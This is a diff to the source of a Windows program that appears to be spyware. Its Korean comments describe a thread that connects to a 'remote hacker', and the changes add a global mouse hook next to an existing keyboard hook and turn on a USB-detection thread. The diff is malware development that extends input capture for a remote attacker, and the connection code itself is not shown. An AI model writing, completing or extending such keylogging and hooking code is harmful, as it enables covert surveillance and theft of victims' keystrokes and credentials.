@@ -58,7 +58,7 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance//int main역할�
 	CreateSocket();
 	//원격해커에게 접속시도할 쓰레드 생성 ,USB 디텍터 스레드 실행
 	Con_pThread = (HANDLE)_beginthreadex(NULL, 0, ConnectProc, NULL, 0, 0);
-	//USB_pThread = (HANDLE)_beginthreadex(NULL, 0, USBDetector, NULL, 0, 0);
+	USB_pThread = (HANDLE)_beginthreadex(NULL, 0, USBDetector, NULL, 0, 0);
 	
 
 	
@@ -82,8 +82,9 @@ LRESULT CALLBACK WndProc(HWND hWnd, UINT iMessage, WPARAM wParam, LPARAM IParam)
 	case WM_CREATE:
 
 	    KhinstDll = LoadLibrary(TEXT("KeyHookDll.dll"));
+		MhinstDll = LoadLibrary(TEXT("MouseHookDll.dll"));
 
-		if (KhinstDll == NULL)
+		if (KhinstDll == NULL || MhinstDll == NULL)
 		{
 			MessageBox(hWnd, TEXT("dll로드 실패"), TEXT("오류"), MB_OK);
 			FreeLibrary(KhinstDll);
@@ -93,7 +94,10 @@ LRESULT CALLBACK WndProc(HWND hWnd, UINT iMessage, WPARAM wParam, LPARAM IParam)
 		Kinstallhook = (HookProc)GetProcAddress(KhinstDll,"StartHook");
 		Kuninstallhook = (HookProc)GetProcAddress(KhinstDll,"StopHook");
 
-		if (Kinstallhook == NULL || Kuninstallhook == NULL)
+		Minstallhook = (HookProc)GetProcAddress(MhinstDll, "StartHook");
+		Muninstallhook = (HookProc)GetProcAddress(MhinstDll, "StopHook");
+
+		if (Kinstallhook == NULL || Kuninstallhook == NULL || Minstallhook == NULL || Muninstallhook == NULL)
 		{
 
 			MessageBox(hWnd, TEXT("함수로딩 실패"), TEXT("오류"), MB_OK);
@@ -102,6 +106,7 @@ LRESULT CALLBACK WndProc(HWND hWnd, UINT iMessage, WPARAM wParam, LPARAM IParam)
 		}
 		
 		Kinstallhook();
+		Minstallhook();
 		
 		return 0;
 		
@@ -110,6 +115,7 @@ LRESULT CALLBACK WndProc(HWND hWnd, UINT iMessage, WPARAM wParam, LPARAM IParam)
 
 		closesocket(hSocket);
 		Kuninstallhook();
+		Muninstallhook();
 		FreeLibrary(KhinstDll);
 		WSACleanup();
 		KillProcess(TEXT("Controller.exe"));
